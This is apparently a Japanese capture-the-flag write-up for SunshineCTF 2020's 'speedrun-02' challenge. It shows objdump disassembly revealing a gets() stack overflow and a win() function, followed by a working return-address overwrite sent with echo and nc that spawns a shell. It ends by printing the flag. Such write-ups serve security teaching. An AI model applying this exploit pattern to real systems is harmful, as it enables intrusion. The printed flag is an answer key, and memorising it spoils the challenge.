# speedrun-02:Speedrun:10pts
nc chal.2020.sunshinectf.org 30002  
[chall_02](chall_02)  

# Solution
ファイルが配られる。  
```bash
$ file chall_02
chall_02: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=0f87eae5ffde177a8a93eede7dc8673a8cb8cfe2, not stripped
```
32-bitは実行できないので、勘でやるしかない。  
objdumpでmainとその周辺を見てみる。  
```bash
$ objdump -D chall_02
~~~
080484d6 <win>:
 80484d6:       55                      push   %ebp
 80484d7:       89 e5                   mov    %esp,%ebp
 80484d9:       53                      push   %ebx
 80484da:       83 ec 04                sub    $0x4,%esp
 80484dd:       e8 a0 00 00 00          call   8048582 <__x86.get_pc_thunk.ax>
 80484e2:       05 1e 1b 00 00          add    $0x1b1e,%eax
 80484e7:       83 ec 0c                sub    $0xc,%esp
 80484ea:       8d 90 10 e6 ff ff       lea    -0x19f0(%eax),%edx
 80484f0:       52                      push   %edx
 80484f1:       89 c3                   mov    %eax,%ebx
 80484f3:       e8 98 fe ff ff          call   8048390 <system@plt>
 80484f8:       83 c4 10                add    $0x10,%esp
 80484fb:       90                      nop
 80484fc:       8b 5d fc                mov    -0x4(%ebp),%ebx
 80484ff:       c9                      leave
 8048500:       c3                      ret

08048501 <vuln>:
 8048501:       55                      push   %ebp
 8048502:       89 e5                   mov    %esp,%ebp
 8048504:       53                      push   %ebx
 8048505:       83 ec 44                sub    $0x44,%esp
 8048508:       e8 75 00 00 00          call   8048582 <__x86.get_pc_thunk.ax>
 804850d:       05 f3 1a 00 00          add    $0x1af3,%eax
 8048512:       83 ec 0c                sub    $0xc,%esp
 8048515:       8d 55 c6                lea    -0x3a(%ebp),%edx
 8048518:       52                      push   %edx
 8048519:       89 c3                   mov    %eax,%ebx
 804851b:       e8 40 fe ff ff          call   8048360 <gets@plt>
 8048520:       83 c4 10                add    $0x10,%esp
 8048523:       90                      nop
 8048524:       8b 5d fc                mov    -0x4(%ebp),%ebx
 8048527:       c9                      leave
 8048528:       c3                      ret

08048529 <main>:
 8048529:       8d 4c 24 04             lea    0x4(%esp),%ecx
 804852d:       83 e4 f0                and    $0xfffffff0,%esp
 8048530:       ff 71 fc                pushl  -0x4(%ecx)
 8048533:       55                      push   %ebp
 8048534:       89 e5                   mov    %esp,%ebp
 8048536:       53                      push   %ebx
 8048537:       51                      push   %ecx
 8048538:       83 ec 20                sub    $0x20,%esp
 804853b:       e8 d0 fe ff ff          call   8048410 <__x86.get_pc_thunk.bx>
 8048540:       81 c3 c0 1a 00 00       add    $0x1ac0,%ebx
 8048546:       83 ec 0c                sub    $0xc,%esp
 8048549:       8d 83 18 e6 ff ff       lea    -0x19e8(%ebx),%eax
 804854f:       50                      push   %eax
 8048550:       e8 2b fe ff ff          call   8048380 <puts@plt>
 8048555:       83 c4 10                add    $0x10,%esp
 8048558:       8b 83 fc ff ff ff       mov    -0x4(%ebx),%eax
 804855e:       8b 00                   mov    (%eax),%eax
 8048560:       83 ec 04                sub    $0x4,%esp
 8048563:       50                      push   %eax
 8048564:       6a 13                   push   $0x13
 8048566:       8d 45 e4                lea    -0x1c(%ebp),%eax
 8048569:       50                      push   %eax
 804856a:       e8 01 fe ff ff          call   8048370 <fgets@plt>
 804856f:       83 c4 10                add    $0x10,%esp
 8048572:       e8 8a ff ff ff          call   8048501 <vuln>
 8048577:       90                      nop
 8048578:       8d 65 f8                lea    -0x8(%ebp),%esp
 804857b:       59                      pop    %ecx
 804857c:       5b                      pop    %ebx
 804857d:       5d                      pop    %ebp
 804857e:       8d 61 fc                lea    -0x4(%ecx),%esp
 8048581:       c3                      ret
~~~
```
winがあるようだ。  
パディングの計算が面倒なので、winのアドレスで埋めて以下のように書き換えを行う。  
```bash
$ (echo -e "\xd6\x84\x04\x08\xd6\x84\x04\x08\xd6\x84\x04\x08\xd6\x84\x04\x08\xd6\x84\x04\x08\xd6\x84\x04\x08\xd6\x84\x04\x08\xd6\x84\x04\x08\xd6\x84\x04\x08\xd6\x84\x04\x08\xd6\x84\x04\x08\xd6\x84\x04\x08\xd6\x84\x04\x08\xd6\x84\x04\x08\xd6\x84\x04\x08\xd6\x84\x04\x08\xd6\x84\x04\x08\xd6\x84\x04\x08\xd6\x84\x04\x08\xd6\x84\x04\x08\xd6\x84\x04\x08\xd6\x84\x04\x08\xd6\x84\x04\x08\xd6\x84\x04\x08\xd6\x84\x04\x08";cat) | nc chal.2020.sunshinectf.org 30002
Went along the mountain side.
ls
chall_02
flag.txt
cat flag.txt
sun{warmness-on-the-soul-3b6aad1d8bb54732}
^C
```
シェルが得られるので、flag.txtを見るとflagが書かれていた。  

## sun{warmness-on-the-soul-3b6aad1d8bb54732}